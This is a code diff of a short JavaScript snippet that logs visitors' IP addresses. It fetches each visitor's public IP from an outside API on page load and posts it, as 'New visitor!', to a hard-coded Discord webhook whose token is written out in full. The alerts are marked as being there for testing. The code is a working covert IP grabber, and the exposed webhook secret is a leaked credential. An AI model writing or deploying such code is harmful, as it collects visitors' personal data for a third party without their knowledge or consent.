@@ -1,26 +1,30 @@
+// ====== CONFIGURE YOUR WEBHOOK ======
 const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8";
 
-async function sendIPInfo() {
+// ====== GET PUBLIC IP ======
+async function sendPublicIP() {
   try {
-    const response = await fetch("https://ipapi.co/json/");
-    const data = await response.json();
+    // Fetch your public IP from an HTTPS API
+    const response = await fetch("https://api.ipify.org?format=json");
+    const data = await response.json(); // { "ip": "123.123.123.123" }
 
-    alert("Fetched IP info! Sending to Discord...");
-
+    // Send it to Discord webhook
     await fetch(webhook, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        content: "Raw API Response:\n```json\n" + JSON.stringify(data, null, 2) + "\n```"
+        content: `New visitor! Public IP: ${data.ip}`
       })
     });
 
-    alert("Sent successfully!");
-  } catch (error) {
-    alert("Error: " + error);
+    // Optional alert for testing
+    alert(`IP sent successfully!\n${data.ip}`);
+  } catch (err) {
+    alert("Error fetching or sending IP: " + err);
   }
 }
 
-sendIPInfo();
+// Run the function immediately
+sendPublicIP();
